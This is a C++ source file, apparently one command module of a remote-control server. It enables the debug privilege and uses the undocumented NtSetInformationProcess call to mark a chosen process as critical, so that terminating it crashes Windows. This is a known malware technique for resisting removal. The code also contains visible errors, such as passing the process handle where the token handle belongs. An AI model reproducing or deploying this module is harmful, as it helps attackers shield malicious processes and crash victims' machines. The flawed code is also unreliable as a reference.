#include "CritProc.h"
#include <TlHelp32.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

EXTERN_C NTSTATUS NTAPI NtSetInformationProcess(HANDLE, ULONG, PVOID, ULONG);

CritProc::CritProc(const DWORD &processID) : processID{processID} {}

bool CritProc::execute() {

  HANDLE processHandle = INVALID_HANDLE_VALUE;
  TOKEN_PRIVILEGES tokenPrivileges;
  LUID luid;
  HANDLE currentProcess;

  currentProcess = GetCurrentProcess();

  std::unique_ptr<HANDLE, void (*)(HANDLE *)> currentProcessPointer(
      &currentProcess, CloseHandleDeleter);

  CHECK_RETURN(LookupPrivilegeValue(NULL, _T("SeDebugPrivilege"), &luid))

  CHECK_RETURN(
      OpenProcessToken(currentProcess, TOKEN_ALL_ACCESS, &processHandle))

  tokenPrivileges.PrivilegeCount = 1;
  tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
  tokenPrivileges.Privileges[0].Luid = luid;

  if (AdjustTokenPrivileges(currentProcess, FALSE, &tokenPrivileges, NULL,
                            (PTOKEN_PRIVILEGES)NULL,
                            (PDWORD)NULL) == ERROR_NOT_ALL_ASSIGNED) {
    Server::AddCommandInString(GetLastErrorAsString(), _T("\n"));
    return false;
  }

  processHandle =
      OpenProcess(PROCESS_SET_INFORMATION | PROCESS_QUERY_LIMITED_INFORMATION,
                  FALSE, processID);

  std::unique_ptr<HANDLE, void (*)(HANDLE *)> processHandlePointer(
      &processHandle, CloseHandleDeleter);

  CHECK_HANDLE_RETURN(processHandle)

  BOOL isCritical;

  CHECK_RETURN(IsProcessCritical(processHandle, &isCritical))

  if (isCritical)
    return false;

  NTSTATUS returnStatus;
  ULONG breakOnTermination = 1;

  returnStatus = NtSetInformationProcess(processHandle, 0x1D,
                                         &breakOnTermination, sizeof(ULONG));

  if (returnStatus != 0) {
    Server::AddCommandInString(_T("Error!\n"));
    return false;
  }
  Server::AddCommandInString(_T("Critizalize Process Succes!\n"));
  return true;
}
